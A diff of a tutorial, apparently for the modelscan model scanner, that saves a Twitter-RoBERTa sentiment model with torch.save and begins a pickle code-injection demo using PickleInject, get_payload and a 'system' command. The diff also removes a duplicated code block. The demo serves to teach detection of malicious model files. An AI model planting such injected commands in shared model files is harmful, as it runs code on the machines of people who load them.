@@ -56,21 +56,6 @@ task = "sentiment"
 MODEL = f"cardiffnlp/twitter-roberta-base-{task}"
 # PT
 model = AutoModelForSequenceClassification.from_pretrained(MODEL)
-torch.save(model,safe_model_path)import torch
-import os
-from transformers import AutoModelForSequenceClassification
-
-# Save a model for sentiment analysis
-model_directory = "SavedModels"
-if not os.path.isdir(model_directory):
-    os.mkdir(model_directory)
-
-safe_model_path = os.path.join(model_directory, "saved_model.pt")
-
-task = "sentiment"
-MODEL = f"cardiffnlp/twitter-roberta-base-{task}"
-# PT
-model = AutoModelForSequenceClassification.from_pretrained(MODEL)
 torch.save(model,safe_model_path)
 ```
 
@@ -91,6 +76,10 @@ Its not a malicious model after all :exclamation:. But we know there is a possib
 ```python
 #Note: This code works well in Google Colab
 
+!git clone https://github.com/protectai/modelscan.git
+
+import torch
+import os
 from modelscan.notebooks.utils.pickle_codeinjection import PickleInject, get_payload
 
 command = "system"
